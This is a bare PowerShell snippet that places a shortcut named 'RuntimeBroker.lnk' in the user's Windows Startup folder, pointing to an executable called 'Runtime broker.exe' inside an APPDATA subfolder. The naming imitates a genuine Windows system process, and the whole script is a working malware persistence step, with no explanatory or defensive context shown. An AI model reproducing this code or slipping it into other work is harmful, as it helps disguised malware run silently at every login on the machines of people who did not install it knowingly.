$targetPath = "$env:APPDATA\SubDir\Runtime broker.exe"
$startupFolder = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\Start Menu\Programs\Startup')
$shortcutName = "RuntimeBroker.lnk"

$shell = New-Object -ComObject WScript.Shell
$shortcut = $shell.CreateShortcut("$startupFolder\$shortcutName")
$shortcut.TargetPath = $targetPath
$shortcut.Save()
